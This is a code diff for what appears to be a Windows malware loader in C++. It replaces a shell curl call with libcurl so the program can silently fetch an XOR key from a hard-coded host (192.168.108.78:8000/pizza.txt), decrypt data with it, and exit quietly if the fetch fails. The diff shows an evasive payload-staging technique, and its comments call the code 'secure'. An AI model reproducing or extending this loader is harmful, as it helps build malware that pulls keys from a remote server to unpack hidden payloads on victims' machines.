@@ -1,30 +1,50 @@
-#include <windows.h>
 #include <stdio.h>
-#include <cstdlib>
+#include <string>
 #include <sstream>
 #include <iostream>
-#include <string>
+#include <windows.h>
+#include <curl/curl.h>
 
 using namespace std;
 
-// Function to fetch the key from a webserver
-string fetchStringFromWeb(const string& url) {
-    string command = "curl -s " + url; // Curl command to fetch content silently
-    ostringstream result;
+// Callback function to write received data into a string
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
+    ((string*)userp)->append((char*)contents, size * nmemb);
+    return size * nmemb;
+}
 
-    // Open a pipe to the curl command
-    FILE* pipe = popen(command.c_str(), "r");
-    if (!pipe) {
-        return ""; // Return an empty string if the command fails
+// Function to fetch data silently and securely using HTTPS
+string fetchFromServerSecure(const string& url) {
+    CURL* curl;
+    CURLcode res;
+    string result;
+
+    curl = curl_easy_init(); // Initialize curl
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &result);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);       // Follow redirects
+        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);          // Disable progress bar
+        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);         // Treat HTTP errors as failures
+        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL); // Enforce SSL/TLS
+
+        // Enforce SSL certificate validation for security
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);      // Verify peer certificate
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);      // Verify host name
+
+        // Suppress all curl output (silent operation)
+        curl_easy_setopt(curl, CURLOPT_STDERR, fopen("/dev/null", "w"));
+
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            // Silent failure: return empty string on error
+            result.clear();
+        }
+
+        curl_easy_cleanup(curl); // Clean up
     }
-
-    char buffer[128];
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-        result << buffer; // Append each line to the stringstream
-    }
-
-    pclose(pipe); // Close the pipe
-    return result.str(); // Return the content as a string
+    return result;
 }
 
 // XOR decryption function
@@ -39,7 +59,7 @@ void XOR(char* data, size_t data_len, const char* key, size_t key_len) {
 int main() {
     // Fetch the key from the webserver
     string url = "http://192.168.108.78:8000/pizza.txt";
-    string result = fetchStringFromWeb(url);
+    string result = fetchFromServerSecure(url);
 
     if (result.empty()) {
         // Exit silently if the key is not fetched
